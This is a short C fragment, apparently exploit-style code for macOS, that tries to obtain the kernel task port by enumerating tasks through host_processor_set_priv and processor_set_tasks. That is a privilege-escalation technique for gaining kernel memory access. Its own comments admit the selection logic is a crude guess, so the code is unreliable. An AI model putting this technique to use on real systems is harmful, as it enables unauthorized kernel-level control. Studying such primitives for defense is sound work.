
#include <mach/mach_types.h>
#include <mach/mach_host.h>
#include <mach/mach_init.h>
#include <mach/task.h>
#include <mach/thread_act.h>
#include <mach/mach_interface.h>
#include <libkern/libkern.h>

// Get kernel task port using processor_set_tasks()
task_t get_kernel_task() {
    processor_set_t pset;
    task_array_t task_list;
    mach_msg_type_number_t task_count;
    kern_return_t kr;

    host_t host = mach_host_self();

    kr = host_processor_set_priv(host, PROCESSOR_SET_DEFAULT, &pset);
    if (kr != KERN_SUCCESS) {
        printf("[-] host_processor_set_priv failed: %d\n", kr);
        return MACH_PORT_NULL;
    }

    kr = processor_set_tasks(pset, &task_list, &task_count);
    if (kr != KERN_SUCCESS) {
        printf("[-] processor_set_tasks failed: %d\n", kr);
        return MACH_PORT_NULL;
    }

    for (mach_msg_type_number_t i = 0; i < task_count; i++) {
        task_t t = task_list[i];
        // Heuristic: kernel task often has PID 0, but we can't directly get PID from task_t.
        // If we had access to kernel_task symbol, we could compare.
        // For demonstration, return the first task (usually kernel task in this array).
        // In reality, more sophisticated checks are required.
        return t;
    }

    return MACH_PORT_NULL;
}
